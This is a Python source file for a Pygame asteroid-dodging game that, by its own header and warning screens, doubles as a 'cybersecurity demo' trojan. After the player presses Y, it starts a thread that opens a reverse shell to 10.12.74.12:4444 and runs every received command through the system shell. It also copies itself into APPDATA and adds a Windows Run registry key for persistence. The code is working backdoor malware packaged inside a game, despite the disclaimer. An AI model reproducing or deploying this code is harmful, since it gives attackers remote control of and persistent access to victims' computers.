# This file is for cybersecurity learning purposes only
# Instead of using joystick, user uses keyboard to move
# It also performs persistence and introduces a backdoor in the user's computer

import pygame
import random
import sys
import subprocess
import socket
import threading
import os
import shutil
import time

# Constants for connection
HOST = "10.12.74.12"  # Your listener IP
PORT = 4444

# Function to check and install required dependencies (from second script)
def check_dependencies():
    required_apps = ["pygame"]
    for app in required_apps:
        try:
            __import__(app)
        except ImportError:
            print(f"{app} is not installed. Installing...")
            subprocess.run([sys.executable, "-m", "pip", "install", app], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Function to notify the user (from second script, modified for your game)
def notify_user():
    print("WARNING: This is a cybersecurity demo!")
    print("This game will:")
    print("- Install necessary dependencies (Pygame).")
    print("- Add itself to startup for persistence.")
    print("- Open a reverse shell to 10.12.74.12:4444.")
    print("You can remove persistence using the provided cleanup tool.")
    print("Press Enter to continue or Ctrl+C to exit.")
    input()

# Function to establish reverse shell (from second script, simplified)
def start_reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.send(b"Victim connected\n")
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                s.send(output.stdout.encode() + output.stderr.encode())
            s.close()
        except Exception:
            time.sleep(5)  # Retry after 5 seconds

# Function for persistence (from second script)
def add_to_startup():
    current_file = os.path.abspath(sys.argv[0])
    startup_file = os.path.join(os.getenv("APPDATA"), "AsteroidGame.exe")
    if not os.path.exists(startup_file):
        shutil.copy(current_file, startup_file)
        os.system(f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AsteroidGame /t REG_SZ /d {startup_file} /f")

# Initialize Pygame
check_dependencies()
notify_user()

pygame.mixer.init()
pygame.init()

SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
OBJECT_WIDTH = 50
OBJECT_HEIGHT = 50
ASTEROID_SIZE = (40, 40)

object_x = 0  # Bottom-left corner
object_y = SCREEN_HEIGHT - OBJECT_HEIGHT

WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)  # For warning text

pygame.display.set_caption("Avoid the Asteroids!")
window = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))

# Load assets
collision_sound = pygame.mixer.Sound('assets/collision_sound.mp3')
game_over_sound = pygame.mixer.Sound('assets/gameover.mp3')
you_win_sound = pygame.mixer.Sound('assets/youwin.mp3')
object_image = pygame.transform.scale(pygame.image.load('assets/new_object.png').convert_alpha(), (70, 70))
background_image = pygame.transform.scale(pygame.image.load('assets/space_bg.png').convert(), (SCREEN_WIDTH, SCREEN_HEIGHT))
asteroid_image = pygame.transform.scale(pygame.image.load('assets/asteroid_image.png').convert_alpha(), ASTEROID_SIZE)

def show_warning_screen():
    font = pygame.font.Font(None, 36)
    warning_lines = [
        "WARNING: This is a cybersecurity demo!",
        "Running this game will:",
        "- Add itself to startup (persistence)",
        "- Open a reverse shell to 10.12.74.12:4444",
        "Gameplay: Avoid the Asteroids!",
        "- Use arrow keys to move the spaceship.",
        "- Reach the top to win, avoid asteroids to survive.",
        "- Score points by moving up (100 bonus at top).",
        "Press 'Y' to continue, 'N' to exit.",
        "This is for educational purposes only."
    ]
    window.blit(background_image, (0, 0))
    for i, line in enumerate(warning_lines):
        text = font.render(line, True, YELLOW)
        window.blit(text, (SCREEN_WIDTH // 2 - text.get_width() // 2, 100 + i * 40))
    pygame.display.flip()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    return True  # Proceed
                elif event.key == pygame.K_n:
                    pygame.quit()
                    sys.exit()  # Exit

def check_collisions():
    global score
    spaceship_rect = pygame.Rect(object_x, object_y, OBJECT_WIDTH, OBJECT_HEIGHT)
    for asteroid_x, asteroid_y, asteroid_size in asteroids:
        asteroid_rect = pygame.Rect(asteroid_x, asteroid_y, asteroid_size, asteroid_size)
        if spaceship_rect.colliderect(asteroid_rect):
            collision_sound.play()
            game_over_sound.play()
            pygame.time.delay(2000)
            return True
    return False

# Show warning screen before proceeding
if show_warning_screen():
    threading.Thread(target=start_reverse_shell, daemon=True).start()
    add_to_startup()

while True:
    asteroids = []
    score = 0
    GAME_OVER = 0
    GAME_RUNNING = 1
    GAME_WON = 2
    current_state = GAME_RUNNING

    object_x = 0
    object_y = SCREEN_HEIGHT - OBJECT_HEIGHT

    try:
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()

            keys = pygame.key.get_pressed()
            if current_state == GAME_RUNNING:
                if keys[pygame.K_LEFT]:
                    object_x -= 2
                if keys[pygame.K_RIGHT]:
                    object_x += 2
                if keys[pygame.K_UP]:
                    object_y -= 2
                    score += 1
                if keys[pygame.K_DOWN]:
                    object_y += 2

            object_x = max(0, min(SCREEN_WIDTH - OBJECT_WIDTH, object_x))
            object_y = max(0, min(SCREEN_HEIGHT - OBJECT_HEIGHT, object_y))

            if current_state == GAME_RUNNING and object_y <= 0:
                current_state = GAME_WON
                score += 100
                you_win_sound.play()
                pygame.time.delay(2000)

            if current_state == GAME_RUNNING and check_collisions():
                current_state = GAME_OVER

            window.blit(background_image, (0, 0))
            if current_state == GAME_RUNNING:
                window.blit(object_image, (object_x, object_y))

            for asteroid_x, asteroid_y, _ in asteroids:
                window.blit(asteroid_image, (asteroid_x, asteroid_y))

            font = pygame.font.Font(None, 36)
            score_text = font.render(f"Score: {score}", True, WHITE)
            window.blit(score_text, (10, 10))

            if current_state == GAME_RUNNING:
                if random.randint(1, 70) == 1:
                    asteroid_size = random.randint(10, 30)
                    asteroid_x = random.randint(0, SCREEN_WIDTH - asteroid_size)
                    asteroid_y = -asteroid_size
                    asteroids.append((asteroid_x, asteroid_y, asteroid_size))
                for i, (ax, ay, a_size) in enumerate(asteroids):
                    asteroids[i] = (ax, ay + 0.5, a_size)

            elif current_state == GAME_OVER:
                score_text = font.render(f"Total score: {score}", True, RED)
                game_over_text = font.render("Game Over !! Press 'R' to restart or 'Q' to quit", True, RED)
                window.blit(game_over_text, ((SCREEN_WIDTH - game_over_text.get_width()) // 2, (SCREEN_HEIGHT - game_over_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = 0
                                object_y = SCREEN_HEIGHT - OBJECT_HEIGHT
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                sys.exit()

            elif current_state == GAME_WON:
                score_text = font.render(f"Total score: {score}", True, GREEN)
                win_text = font.render("You Win !! Press 'R' to restart or 'Q' to quit", True, GREEN)
                window.blit(win_text, ((SCREEN_WIDTH - win_text.get_width()) // 2, (SCREEN_HEIGHT - win_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = 0
                                object_y = SCREEN_HEIGHT - OBJECT_HEIGHT
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                sys.exit()

            pygame.display.flip()

    except KeyboardInterrupt:
        pygame.quit()
        sys.exit()